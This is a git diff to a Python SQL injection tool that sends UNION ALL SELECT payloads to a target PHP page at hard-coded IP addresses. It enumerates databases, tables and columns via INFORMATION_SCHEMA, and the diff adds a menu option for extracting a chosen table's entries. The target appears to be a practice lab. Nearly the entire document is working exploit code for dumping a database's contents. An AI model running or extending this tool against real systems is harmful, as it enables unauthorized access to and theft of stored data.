@@ -8,8 +8,8 @@ def get_sqli_info(payload):
 		{"data": "database","value":"", "payload":""},
 		{"data": "username","value":"", "payload":""},
 		{"data": "version","value":"", "payload":""},
-        {"data": "tables","value":"", "payload":""},
-        {"data": "columns","value":"", "payload":""},
+        {"data": "tables","value":"", "payload":"", "origin_database":""},
+        {"data": "columns","value":"", "payload":"", "origin_table":""},
         {"data": "entries","value":"", "payload":""}
 	]
     info = [
@@ -18,7 +18,7 @@ def get_sqli_info(payload):
 		{"payload":"@@version",		"source":""}, # DBMS Version
         {"payload":"TABLE_NAME",    "source": "FROM INFORMATION_SCHEMA.TABLES"},
         {"payload":"COLUMN_NAME",    "source": "FROM INFORMATION_SCHEMA.COLUMNS"},
-        {"payload":"CONCAT_WS(0x3a, column1, column2)",    "source": "FROM table_name"}, #Entries
+        {"payload":"(column_names)",    "source": "FROM table_name"}, #Entries
 
 	]
     cont = 0
@@ -103,7 +103,7 @@ headers = read_headers_file("./headers.txt")
 payload = {"id": "1"}
 sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
 
-#WORKING CODE
+#GET SQLI DATA FUNCTIONS
 def show_tables_from_specific_database(sqli):
     """
     Show tables from specific database
@@ -127,6 +127,7 @@ def show_tables_from_specific_database(sqli):
     sqli.data[3]['payload'] = sqli.data[3]['payload'].replace("INFORMATION_SCHEMA.TABLES", f"INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='{option}'")
     #Get tables
     sqli.data[3] = get_dbms_data_values(sqli,3).data[3]
+    sqli.data[3]['origin_database'] = option
     return sqli
 
 def show_columns_from_specific_table(sqli):
@@ -145,8 +146,27 @@ def show_columns_from_specific_table(sqli):
     sqli.data[4]['payload'] = sqli.data[4]['payload'].replace("INFORMATION_SCHEMA.COLUMNS", f"INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{option}'")
     #Get columns
     sqli.data[4] = get_dbms_data_values(sqli,4).data[4]
+    sqli.data[4]['origin_table'] = option
     return sqli
-#------------
+
+def show_entries_from_specific_table(sqli):
+    print("Available :")
+    if sqli.data[4]['value'] == "":
+        print("\033[31mNo columns data available. Please run 'Show columns from specific table' first.\033[0m")
+        return
+    for column in sqli.data[4]['value']:
+        print(f"\033[37m- {column}\033[0m")
+    column = str(input("Choose column to extract:\t\033[0m"))
+    while column not in sqli.data[4]['value']:
+        column = str(input("Invalid column. Choose column:\t\033[0m"))
+    payload_columns = column
+    
+    sqli.data[5]['payload'] = sqli.data[5]['payload'].replace("(column_names)", payload_columns).replace("table_name", sqli.data[4]['origin_table'])
+    print(sqli.data[5]['payload'])
+    sqli.data[5] = get_dbms_data_values(sqli,5).data[5]
+
+    return sqli
+
 def get_dbms_data_values(sqli, data_index=0):
     try:
         response1 = post_request(sqli.url, sqli.payload, sqli.headers).text
@@ -159,6 +179,7 @@ def get_dbms_data_values(sqli, data_index=0):
     except requests.RequestException as e:
         print(f"\033[31mError during request: {e}\033[0m")
         return sqli
+
 
 def menu(option, sqli):
     result = 0
@@ -184,6 +205,8 @@ def menu(option, sqli):
         sqli.data[3] = show_tables_from_specific_database(sqli).data[3]
     elif option == 31:
         sqli.data[4] = show_columns_from_specific_table(sqli).data[4]
+    elif option == 32:
+        sqli.data[5] = show_entries_from_specific_table(sqli).data[5]
     if result == 0:
         run(sqli)
 
@@ -212,6 +235,7 @@ def run(sqli):
     #print("22)\tGet DBMS Version")
     print("30)\tShow tables from specific database")
     print("31)\tShow columns from specific table")
+    print("32)\tShow entries from specific table (Not implemented yet)")
     print("\n0) Exit")
     
     option = int(input("Choose option:\t"))
@@ -219,7 +243,7 @@ def run(sqli):
 
 def main ():
     #DEFAULT VALUES
-    url = "http://"+"83.136.252.32:52854/case2.php"
+    url = "http://"+"94.237.122.95:55781/case2.php"
     headers = read_headers_file("./headers.txt")
     payload = {"id": "1"}
     sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
